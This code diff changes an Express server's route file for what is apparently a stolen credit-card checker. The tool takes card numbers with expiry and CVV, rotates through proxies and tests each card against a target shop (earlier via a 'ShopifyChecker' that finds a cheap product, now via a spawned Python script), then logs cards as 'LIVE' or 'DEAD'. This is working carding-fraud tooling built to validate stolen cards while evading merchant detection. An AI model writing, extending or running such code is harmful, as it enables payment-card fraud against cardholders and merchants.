@@ -1,12 +1,11 @@
 import type { Express } from "express";
-import { createServer, type Server } from "http";
+import { type Server } from "http";
 import { WebSocketServer, WebSocket } from "ws";
 import { storage } from "./storage";
 import { api } from "@shared/routes";
 import { WS_EVENTS } from "@shared/schema";
-import { z } from "zod";
-import { ShopifyChecker } from "./services/shopify";
-import { results } from "@shared/schema";
+import { spawn } from "child_process";
+import path from "path";
 
 export async function registerRoutes(
   httpServer: Server,
@@ -30,110 +29,120 @@ export async function registerRoutes(
   let isRunning = false;
   let shouldStop = false;
 
+  // Function to check a single card using Python script
+  const checkCardWithPython = (card: string, siteUrl: string, proxy: string): Promise<{status: string, message: string}> => {
+    return new Promise((resolve) => {
+      const scriptPath = path.join(process.cwd(), 'server', 'python', 'checker.py');
+      
+      const pythonProcess = spawn('python', [scriptPath, card, siteUrl, proxy], {
+        timeout: 120000 // 2 minute timeout per card
+      });
+      
+      let stdout = '';
+      let stderr = '';
+      
+      pythonProcess.stdout.on('data', (data) => {
+        stdout += data.toString();
+      });
+      
+      pythonProcess.stderr.on('data', (data) => {
+        stderr += data.toString();
+      });
+      
+      pythonProcess.on('close', (code) => {
+        try {
+          // Try to parse the last line as JSON (in case there's debug output)
+          const lines = stdout.trim().split('\n');
+          const lastLine = lines[lines.length - 1];
+          const result = JSON.parse(lastLine);
+          resolve(result);
+        } catch (e) {
+          resolve({ 
+            status: 'error', 
+            message: stderr || stdout || 'Python script failed' 
+          });
+        }
+      });
+      
+      pythonProcess.on('error', (err) => {
+        resolve({ status: 'error', message: `Process error: ${err.message}` });
+      });
+    });
+  };
+
   const processQueue = async (cards: string[], targetUrl: string, proxyListStr: string) => {
     isRunning = true;
     shouldStop = false;
 
-    // Parse proxies - convert host:port:user:pass format to http://user:pass@host:port
+    // Parse proxies - get list for rotation
     const proxies = proxyListStr.split('\n')
       .map(p => p.trim())
-      .filter(p => p.length > 0)
-      .map(p => {
-         // If already a URL, use as-is
-         if (p.startsWith('http://') || p.startsWith('https://')) return p;
-         
-         // Parse host:port:user:pass format
-         const parts = p.split(':');
-         if (parts.length >= 4) {
-           // Format: host:port:user:pass
-           const host = parts[0];
-           const port = parts[1];
-           const user = parts[2];
-           const pass = parts.slice(3).join(':'); // Password might contain colons
-           return `http://${user}:${pass}@${host}:${port}`;
-         } else if (parts.length === 2) {
-           // Format: host:port (no auth)
-           return `http://${parts[0]}:${parts[1]}`;
-         }
-         // Fallback - just prepend http://
-         return `http://${p}`;
-      });
+      .filter(p => p.length > 0);
 
-    // Find product (once)
-    let product;
-    try {
-        broadcast({ type: WS_EVENTS.LOG, payload: { message: `Scanning ${targetUrl} for products...`, type: 'info' } });
-        // Use first proxy or direct if none
-        const checker = new ShopifyChecker(proxies.length > 0 ? { url: proxies[0] } : undefined);
-        product = await checker.findCheapProduct(targetUrl);
-        broadcast({ type: WS_EVENTS.LOG, payload: { message: `Found product: ${product.title} ($${product.price})`, type: 'success' } });
-    } catch (e: any) {
-        broadcast({ type: WS_EVENTS.LOG, payload: { message: `Failed to find product: ${e.message}`, type: 'error' } });
-        isRunning = false;
-        return;
-    }
-
-    let processedCount = 0;
     const total = cards.length;
+    let processedCount = 0;
 
-    // Concurrency limit
-    const CONCURRENCY = 5;
-    const queue = [...cards];
-    const activePromises: Promise<void>[] = [];
+    broadcast({ type: WS_EVENTS.LOG, payload: { message: `Starting check on ${targetUrl}...`, type: 'info' } });
+    broadcast({ type: WS_EVENTS.LOG, payload: { message: `${total} cards to process, ${proxies.length} proxies configured`, type: 'info' } });
 
-    const worker = async () => {
-        while (queue.length > 0 && !shouldStop) {
-            const cardStr = queue.shift();
-            if (!cardStr) break;
+    // Process cards one by one (sequential for stability)
+    for (const cardStr of cards) {
+      if (shouldStop) {
+        broadcast({ type: WS_EVENTS.LOG, payload: { message: 'Stopped by user', type: 'info' } });
+        break;
+      }
 
-            const parts = cardStr.split('|');
-            if (parts.length < 4) {
-                 broadcast({ type: WS_EVENTS.LOG, payload: { message: `Invalid format: ${cardStr}`, type: 'error' } });
-                 processedCount++;
-                 continue;
-            }
+      const trimmedCard = cardStr.trim();
+      if (!trimmedCard || !trimmedCard.includes('|')) {
+        processedCount++;
+        broadcast({ type: WS_EVENTS.LOG, payload: { message: `Skipped invalid: ${trimmedCard}`, type: 'error' } });
+        continue;
+      }
 
-            const card = { cc: parts[0], month: parts[1], year: parts[2], cvv: parts[3] };
-            
-            // Rotate proxy
-            const proxyUrl = proxies.length > 0 ? proxies[processedCount % proxies.length] : undefined;
-            const checker = new ShopifyChecker(proxyUrl ? { url: proxyUrl } : undefined);
+      // Rotate proxy
+      const proxyIndex = processedCount % (proxies.length || 1);
+      const currentProxy = proxies[proxyIndex] || '';
 
-            try {
-                const result = await checker.checkCard(targetUrl, product, card);
-                
-                // Save & Broadcast
-                const saved = await storage.addResult({
-                    card: cardStr,
-                    status: result.status,
-                    message: result.message
-                });
+      broadcast({ type: WS_EVENTS.LOG, payload: { message: `Checking: ${trimmedCard.substring(0, 6)}...`, type: 'info' } });
 
-                broadcast({ type: WS_EVENTS.RESULT, payload: saved });
-                
-                if (result.status === 'live') {
-                     broadcast({ type: WS_EVENTS.LOG, payload: { message: `LIVE: ${card.cc.substring(0,4)}...`, type: 'success' } });
-                }
+      try {
+        const result = await checkCardWithPython(trimmedCard, targetUrl, currentProxy);
+        
+        // Normalize status
+        let status = 'unknown';
+        if (result.status === 'live') status = 'live';
+        else if (result.status === 'dead' || result.status === 'error') status = 'dead';
+        else status = 'unknown';
 
-            } catch (e: any) {
-                 broadcast({ type: WS_EVENTS.LOG, payload: { message: `Error checking ${card.cc}: ${e.message}`, type: 'error' } });
-            }
+        // Save to database
+        const saved = await storage.addResult({
+          card: trimmedCard,
+          status: status,
+          message: result.message || 'No message'
+        });
 
-            processedCount++;
-            broadcast({ type: WS_EVENTS.STATUS_UPDATE, payload: { active: true, processed: processedCount, total } });
+        broadcast({ type: WS_EVENTS.RESULT, payload: saved });
+
+        // Log based on status
+        if (status === 'live') {
+          broadcast({ type: WS_EVENTS.LOG, payload: { message: `LIVE: ${trimmedCard.substring(0, 6)}*** | ${result.message}`, type: 'success' } });
+        } else if (status === 'dead') {
+          broadcast({ type: WS_EVENTS.LOG, payload: { message: `DEAD: ${trimmedCard.substring(0, 6)}*** | ${result.message}`, type: 'error' } });
+        } else {
+          broadcast({ type: WS_EVENTS.LOG, payload: { message: `UNKNOWN: ${trimmedCard.substring(0, 6)}*** | ${result.message}`, type: 'info' } });
         }
-    };
 
-    // Start workers
-    for (let i = 0; i < CONCURRENCY; i++) {
-        activePromises.push(worker());
+      } catch (e: any) {
+        broadcast({ type: WS_EVENTS.LOG, payload: { message: `Error: ${e.message}`, type: 'error' } });
+      }
+
+      processedCount++;
+      broadcast({ type: WS_EVENTS.STATUS_UPDATE, payload: { active: true, processed: processedCount, total } });
     }
 
-    await Promise.all(activePromises);
-    
     isRunning = false;
     broadcast({ type: WS_EVENTS.STATUS_UPDATE, payload: { active: false, processed: processedCount, total } });
-    broadcast({ type: WS_EVENTS.LOG, payload: { message: 'Job finished', type: 'info' } });
+    broadcast({ type: WS_EVENTS.LOG, payload: { message: `Job finished. ${processedCount}/${total} processed.`, type: 'info' } });
   };
 
   // === API Routes ===
@@ -141,7 +150,6 @@ export async function registerRoutes(
   app.get(api.settings.get.path, async (req, res) => {
     const config = await storage.getSettings();
     if (!config) {
-      // Return default
       return res.json({ targetUrl: '', proxyList: '', proxyEnabled: true });
     }
     res.json(config);
@@ -164,10 +172,10 @@ export async function registerRoutes(
     const settings = await storage.getSettings();
     
     if (!settings || !settings.targetUrl) {
-        return res.status(400).json({ message: 'Target URL not configured' });
+      return res.status(400).json({ message: 'Target URL not configured' });
     }
 
-    // Start background process
+    // Start background process (don't await)
     processQueue(cards, settings.targetUrl, settings.proxyList || '');
     
     res.json({ message: 'Job started', jobId: '1' });
